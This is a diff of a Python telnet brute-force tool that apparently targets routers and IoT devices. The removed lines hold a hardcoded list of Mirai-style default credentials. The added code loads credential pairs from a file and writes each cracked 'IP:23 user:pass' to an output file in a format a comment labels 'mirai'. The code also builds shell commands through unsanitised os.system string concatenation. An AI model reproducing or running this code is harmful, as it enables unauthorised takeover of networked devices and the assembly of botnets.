@@ -16,17 +16,15 @@ threads = int(sys.argv[2])
 output_file = sys.argv[3]
 queue = Queue()
 queue_count = 0
+
+combo = []
  
-combo = [ #use as many passwords as ya want(P.S. The more passwords the slower the bruteforce is going to be)
-    "support:support",
-    "admin:admin",
-    "user:user",
-    "root:antslq",
-    "supervisor:zyad1234",
-    "root:xc3511",
-    "root:vizxv",
-    "root: "
-]
+with open('List.pwd','r') as f:
+    for d in f.readlines():
+     got = d.replace('\n','').replace(' ',':')
+     if got not in combo:
+         combo.append(got)
+         print got
  
 for ip in ips:
     queue_count += 1
@@ -127,12 +125,9 @@ class router(threading.Thread):
                     tn.close()
                 if success == True:
                     try:
-                        #os.system("echo "+self.ip+" >> "+output_file+"") #1.1.1.1 # bios.txt
-                        #os.system("echo "+self.ip+":"+username+":"+password+" >> "+output_file+"")    # 1.1.1.1:user:pass # regular
-                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
+                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
                         print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                         tn.close()
-                        break
                     except:
                         tn.close()
                 tn.close()
